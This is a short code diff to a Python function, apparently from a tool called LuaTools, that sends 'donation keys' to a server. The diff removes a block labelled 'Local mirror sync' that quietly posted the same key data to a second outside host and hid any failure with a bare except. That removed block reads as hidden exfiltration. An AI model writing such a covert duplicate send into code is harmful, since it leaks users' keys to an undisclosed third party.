@@ -262,16 +262,6 @@ def send_donation_keys(pairs: List[Tuple[str, str]]) -> bool:
             f"({len(pairs) - len(new_pairs)} already donated, skipped)"
         )
 
-        # Local mirror sync
-        try:
-            client.post(
-                "https://luat-redirect.piqseu.cc/donatekeys/send",
-                headers=DONATION_HEADERS,
-                content=formatted_data,
-            )
-        except:
-            pass
-
         response = client.post(
             DONATION_URL,
             headers=DONATION_HEADERS,
@@ -289,5 +279,5 @@ def send_donation_keys(pairs: List[Tuple[str, str]]) -> bool:
             return False
 
     except Exception as exc:
-        logger.warn(f"LuaTools: Failed to send donation keys: {exc}")
+        logger.log(f"LuaTools: Failed to send donation keys: {exc}")
         return False
